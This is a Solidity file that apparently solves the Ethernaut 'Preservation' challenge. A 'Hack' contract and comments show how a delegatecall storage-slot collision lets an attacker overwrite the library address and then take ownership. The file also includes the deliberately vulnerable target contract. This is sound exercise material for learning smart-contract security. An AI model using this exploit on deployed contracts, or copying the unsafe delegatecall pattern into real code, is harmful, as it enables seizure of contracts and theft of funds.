// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack{

    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));


    function attack(Preservation _target) public {
        _target.setFirstTime(uint256(uint160(address(this))));
        _target.setFirstTime(uint256(uint160(msg.sender)));
        require(_target.owner() ==msg.sender,"failed");

    }
    function setTime(uint _time) public {
        owner = address(uint160(_time));
    } 


}

// what we did 
//     LibraryContract sets storedTime but for delegate call to work properly it should resembles the declared variables
//     in here it sets Storedtime but at the location 0 of the Preservation contract which is variable timeZone1Library

//     1) so we call setFirstTime and set timeZone1Library to the hack contract  

//     we allign the varables in the Hack contract and also defin the function setTime which actually assigns the owner 

//     2) next we call setFirstTime again with the msg.sender to claim the ownership here timeZone1Library is the hack contract as from the priv step 
//     so it calls the setTime inside the hack contract 

//     note : ignore setSecondTime its just for confusion 



contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}




